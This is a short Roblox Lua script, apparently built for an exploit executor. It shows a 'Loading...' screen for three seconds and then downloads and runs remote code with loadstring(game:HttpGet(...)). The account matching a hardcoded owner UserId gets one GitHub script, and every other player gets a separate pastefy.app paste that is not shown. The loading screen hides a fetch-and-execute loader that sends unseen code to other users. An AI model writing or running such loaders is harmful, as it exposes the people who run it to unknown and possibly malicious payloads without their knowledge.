local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Replace this with your Roblox UserId
local OWNER_USER_ID = 123456789

-- Loading Screen
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame.Parent = ScreenGui

local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "Loading..."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Parent = Frame

-- Wait before running the script
task.wait(3)

-- Remove loading screen
ScreenGui:Destroy()

-- Run different scripts based on the player
if LocalPlayer.UserId == OWNER_USER_ID then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/raw-scripts/MyOwnLoadingLua/refs/heads/main/lua"))()
else
    loadstring(game:HttpGet("https://pastefy.app/9vBiMMcz/raw", true))()
end
